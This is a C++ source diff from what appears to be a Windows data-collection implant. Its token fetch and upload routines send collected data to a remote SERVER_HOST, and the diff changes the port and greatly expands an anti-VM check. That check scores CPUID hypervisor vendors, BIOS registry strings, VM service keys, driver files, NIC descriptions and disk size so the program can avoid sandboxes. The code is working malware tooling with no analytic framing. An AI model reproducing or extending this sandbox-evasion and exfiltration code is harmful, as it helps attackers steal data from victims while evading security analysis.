@@ -14,6 +14,7 @@
 #include <dshow.h>
 #include <gdiplus.h>
 #include <ShlObj.h>
+#include <intrin.h>
 #include "config.h"
 
 #define ANTI_VM 1  // 1 = block VMs, 0 = allow
@@ -417,7 +418,7 @@ std::string fetch_token()
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hSession) { diag_log("token: WinHttpOpen failed"); return token; }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8890, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8080, 0);
     if (!hConnect) { diag_log("token: WinHttpConnect failed"); WinHttpCloseHandle(hSession); return token; }
 
     HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", L"/token",
@@ -582,7 +583,7 @@ void upload_data()
             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
         if (!hSession) { diag_log("upload: WinHttpOpen fail"); Sleep(2000); continue; }
 
-        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8890, 0);
+        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8080, 0);
         if (!hConnect) { diag_log("upload: Connect fail"); WinHttpCloseHandle(hSession); Sleep(2000); continue; }
 
         // build URL with token as query param
@@ -1080,7 +1081,7 @@ void simple_upload()
     // fetch token via WinHTTP
     HINTERNET hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hS) return;
-    HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 8890, 0);
+    HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 8080, 0);
     if (hC) {
         HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/token", nullptr, nullptr, nullptr, 0);
         if (hR && WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(hR, nullptr)) {
@@ -1166,7 +1167,7 @@ void simple_upload()
     std::wstring wu(url.begin(), url.end());
     hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hS) return;
-    hC = WinHttpConnect(hS, SERVER_HOST, 8890, 0);
+    hC = WinHttpConnect(hS, SERVER_HOST, 8080, 0);
     if (hC) {
         HINTERNET hR = WinHttpOpenRequest(hC, L"POST", wu.c_str(), nullptr, nullptr, nullptr, 0);
         if (hR) {
@@ -1316,36 +1317,147 @@ void guarded_collect()
     guarded_upload();
 }
 
+// registry key hit helper
+static bool reg_exists(HKEY root, const wchar_t* path)
+{
+    HKEY hk;
+    bool ok = RegOpenKeyExW(root, path, 0, KEY_READ, &hk) == ERROR_SUCCESS;
+    if (ok) RegCloseKey(hk);
+    return ok;
+}
+static std::wstring reg_read(HKEY root, const wchar_t* path, const wchar_t* val)
+{
+    HKEY hk; std::wstring s;
+    if (RegOpenKeyExW(root, path, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
+        wchar_t buf[256] = {}; DWORD sz = sizeof(buf);
+        RegQueryValueExW(hk, val, nullptr, nullptr, (BYTE*)buf, &sz);
+        RegCloseKey(hk);
+        s = buf;
+    }
+    return s;
+}
+
 bool is_vm()
 {
-    // check for VM registry keys
+    int score = 0;
+
+    // ---- L1: CPUID hypervisor bit ----
+    int cpuInfo[4] = {};
+    __cpuid(cpuInfo, 1);
+    if (cpuInfo[2] & (1 << 31)) { score += 3; }  // hypervisor present
+
+    // CPUID hypervisor vendor leaf (0x40000000)
+    char vendor[13] = {};
+    __cpuid(cpuInfo, 0x40000000);
+    memcpy(vendor, &cpuInfo[1], 4);
+    memcpy(vendor + 4, &cpuInfo[2], 4);
+    memcpy(vendor + 8, &cpuInfo[3], 4);
+    if (strstr(vendor, "VMware") || strstr(vendor, "KVMKVMKVM") ||
+        strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "Microsoft Hv") ||
+        strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv"))
+        score += 5;
+
+    // ---- L2: SMBIOS system manufacturer ----
+    std::wstring sysMfr = reg_read(HKEY_LOCAL_MACHINE,
+        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer");
+    std::wstring sysProd = reg_read(HKEY_LOCAL_MACHINE,
+        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemProductName");
+    const wchar_t* vmNames[] = { L"VMware", L"VirtualBox", L"QEMU", L"KVM",
+        L"innotek", L"Xen", L"Parallels", L"Hyper-V", L"Bochs", L"Virt", L"Oracle" };
+    for (auto* n : vmNames) {
+        if (sysMfr.find(n) != std::wstring::npos) { score += 4; break; }
+    }
+    for (auto* n : vmNames) {
+        if (sysProd.find(n) != std::wstring::npos) { score += 3; break; }
+    }
+
+    // BIOS version string
+    std::wstring biosVer = reg_read(HKEY_LOCAL_MACHINE,
+        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVersion");
+    for (auto* n : vmNames) {
+        if (biosVer.find(n) != std::wstring::npos) { score += 2; break; }
+    }
+
+    // ---- L3: Registry keys (VMware/VBox tools & services) ----
     const wchar_t* regKeys[] = {
         L"SOFTWARE\\VMware, Inc.\\VMware Tools",
         L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
-        L"SOFTWARE\\Classes\\Applications\\VMwareHostOpen.exe",
         L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
         L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
         L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
         L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
+        L"SYSTEM\\CurrentControlSet\\Services\\vmci",
+        L"SYSTEM\\CurrentControlSet\\Services\\VMnetDHCP",
+        L"SYSTEM\\CurrentControlSet\\Services\\VMnetuserif",
+        L"SYSTEM\\CurrentControlSet\\Services\\vmmemctl",
+        L"SYSTEM\\CurrentControlSet\\Services\\vmusb",
+        L"SYSTEM\\CurrentControlSet\\Services\\VMTools",
+        L"SYSTEM\\CurrentControlSet\\Services\\vmbus",
+        L"SYSTEM\\CurrentControlSet\\Services\\VirtIO",
+        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
     };
-    for (auto* k : regKeys) {
-        HKEY hk;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
-            RegCloseKey(hk);
-            return true;
-        }
-    }
-    // check for VM drivers
+    for (auto* k : regKeys) { if (reg_exists(HKEY_LOCAL_MACHINE, k)) { score += 2; } }
+
+    // ---- L4: VM driver files ----
     const wchar_t* drivers[] = {
         L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
         L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
         L"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
         L"C:\\Windows\\System32\\drivers\\vmmouse.sys",
+        L"C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
+        L"C:\\Windows\\System32\\drivers\\vm3dmp.sys",
+        L"C:\\Windows\\System32\\drivers\\vmscsi.sys",
+        L"C:\\Windows\\System32\\drivers\\vmmemctl.sys",
+        L"C:\\Windows\\System32\\drivers\\vmxnet.sys",
+        L"C:\\Windows\\System32\\drivers\\vmci.sys",
     };
-    for (auto* d : drivers) {
-        if (GetFileAttributesW(d) != INVALID_FILE_ATTRIBUTES) return true;
+    for (auto* d : drivers) { if (GetFileAttributesW(d) != INVALID_FILE_ATTRIBUTES) { score += 3; } }
+
+    // ---- L5: VM NIC driver names via registry ----
+    HKEY hClass;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}",
+        0, KEY_READ, &hClass) == ERROR_SUCCESS) {
+        for (int idx = 0; ; idx++) {
+            wchar_t sub[64]; DWORD sz = (DWORD)std::size(sub);
+            if (RegEnumKeyExW(hClass, idx, sub, &sz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
+            HKEY hSub;
+            if (RegOpenKeyExW(hClass, sub, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
+                std::wstring desc = reg_read(hClass, sub, L"DriverDesc");
+                if (desc.find(L"VirtualBox") != std::wstring::npos ||
+                    desc.find(L"VMware") != std::wstring::npos ||
+                    desc.find(L"VirtIO") != std::wstring::npos ||
+                    desc.find(L"Hyper-V") != std::wstring::npos) {
+                    score += 3;
+                    RegCloseKey(hSub);
+                    break;
+                }
+                RegCloseKey(hSub);
+            }
+        }
+        RegCloseKey(hClass);
     }
-    return false;
+
+    // ---- L6: Disk size < 60GB heuristic ----
+    ULARGE_INTEGER totalBytes;
+    if (GetDiskFreeSpaceExW(L"C:\\", nullptr, &totalBytes, nullptr)) {
+        ULONGLONG gb = totalBytes.QuadPart / (1024ULL * 1024 * 1024);
+        if (gb < 60) score += 1;
+    }
+
+    // ---- L7: WMI: Win32_ComputerSystem Manufacturer/Model shortcut via registry ----
+    std::wstring csMfr = reg_read(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", L"SystemManufacturer");
+    std::wstring csMod = reg_read(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", L"SystemProductName");
+    for (auto* n : vmNames) {
+        if (csMfr.find(n) != std::wstring::npos) { score += 3; break; }
+    }
+    for (auto* n : vmNames) {
+        if (csMod.find(n) != std::wstring::npos) { score += 3; break; }
+    }
+
+    return score >= 4;  // threshold: 4+ points → VM detected
 }
 
 int main()
